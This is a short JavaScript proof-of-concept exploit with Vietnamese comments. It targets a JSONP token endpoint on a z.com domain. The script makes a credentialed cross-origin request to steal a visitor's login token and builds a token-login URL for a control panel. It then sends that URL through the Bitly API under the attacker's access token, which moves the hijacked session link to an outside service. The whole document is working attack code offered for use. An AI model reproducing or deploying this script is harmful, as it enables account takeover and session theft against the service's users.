<script type="text/javascript">
// tien hanh get link co the dang nhap duoc
              var http = new XMLHttpRequest();
              http.open("get", "https://domain.z.com/vn/cart/jsonp/GetToken/?callback=", true);
              http.withCredentials = true;
              http.onreadystatechange = function() 
            {
                if (http.readyState == 4 && http.status == 200) 
                { 
                   // alert(this.responseText); 
                   var domainctl = "https://cp-vn.cloud.z.com/TokenLogin?token="
                   var str = this.responseText
                   // alert(exploit)
                    var content = str.replace(/token/g, '');
                    var name = content.replace(/[({""});:]/g, "");
                    var exploit = domainctl+name
                    alert(exploit)
                    // thay doi access_token thanh access_token cua ban
                    var urli = "https://api-ssl.bitly.com/v3/shorten?longUrl="+exploit+"&access_token=xxxxxxxxxx"
                    alert(urli)
                    var mtdev = new XMLHttpRequest();
                    mtdev.open("get", urli, true);
                    mtdev.send();
                }
            }

            http.send();
</script>
